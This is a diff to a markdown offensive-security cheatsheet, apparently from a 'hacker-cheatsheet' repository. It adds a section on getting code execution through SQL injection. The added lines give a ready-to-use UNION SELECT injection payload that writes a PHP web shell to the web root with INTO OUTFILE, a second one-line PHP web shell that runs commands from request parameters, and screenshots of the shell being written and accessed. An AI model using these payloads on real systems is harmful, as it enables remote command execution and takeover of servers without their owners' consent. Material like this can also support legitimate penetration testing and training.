@@ -41,5 +41,18 @@ Executing Commands via xp_cmdshell
 ># =====================================
 >```
 
-Loading the Customer Search Portal
->![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/UNION-based-Payloads-9.png)
+Write a WebShell To Disk via INTO OUTFILE directive
+>``` shell
+>' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+>```
+
+PHP web shell
+>``` shell
+><? system($_REQUEST['cmd']); ?>
+>```
+
+Writing the WebShell to Disk
+>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Manual-Code-Execution-17.png)
+
+Accessing the Webshell
+>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Manual-Code-Execution-18.png)
